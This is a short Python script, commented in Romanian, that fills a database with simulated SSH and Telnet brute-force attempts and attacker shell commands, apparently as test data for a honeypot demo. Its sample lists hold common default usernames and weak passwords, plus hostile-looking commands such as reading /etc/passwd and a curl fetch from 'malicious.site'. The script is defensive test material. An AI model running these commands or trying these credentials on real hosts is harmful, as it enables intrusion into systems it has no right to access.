"""Script utilitar pentru simularea de atacuri brute-force pe SSH și Telnet.

Folosit pentru popularea bazei de date cu date de test și pentru Demo 1.
"""

import random
import time

from src.storage import db

SAMPLE_IPS = [
    "192.168.1.45",
    "10.0.0.15",
    "172.16.0.88",
    "198.51.100.23",
    "203.0.113.195",
    "185.220.101.5",
]

SAMPLE_USERS = [
    "root",
    "admin",
    "user",
    "ubuntu",
    "support",
    "test",
    "guest",
    "oracle",
]

SAMPLE_PASSWORDS = [
    "admin",
    "123456",
    "password",
    "root",
    "12345678",
    "qwerty",
    "toor",
    "test1234",
    "admin123",
    "111111",
]

SAMPLE_COMMANDS = [
    "uname -a",
    "whoami",
    "ls -la /root",
    "cat /etc/passwd",
    "id",
    "pwd",
    "curl http://malicious.site/script.sh",
]


def simulate_single_attack():
    """Generează o tentativă de login simulată."""
    protocol = random.choice(["SSH", "TELNET"])
    ip = random.choice(SAMPLE_IPS)
    port = random.randint(1024, 65535)
    user = random.choice(SAMPLE_USERS)
    password = random.choice(SAMPLE_PASSWORDS)

    success = db.save_auth_attempt(
        protocol=protocol,
        source_ip=ip,
        source_port=port,
        username=user,
        password=password,
        status="REJECTED",
    )
    if success:
        print(f"[{protocol}] Atac simulat: IP={ip} User={user} Pass={password}")


def simulate_batch(count: int = 15):
    """Generează un set de atacuri și câteva comenzi de shell."""
    print(f"--- Generare {count} atacuri simulate în MySQL ---")
    for _ in range(count):
        simulate_single_attack()
        time.sleep(0.05)

    session_id = f"sess_{random.randint(1000, 9999)}"
    sample_ip = random.choice(SAMPLE_IPS)
    for cmd in random.sample(SAMPLE_COMMANDS, 3):
        db.save_shell_command(session_id, sample_ip, cmd)
        print(f"[SHELL] Comandă simulată: Sess={session_id} Cmd='{cmd}'")

    print("--- Simulare finalizată cu succes! ---")


if __name__ == "__main__":
    simulate_batch(20)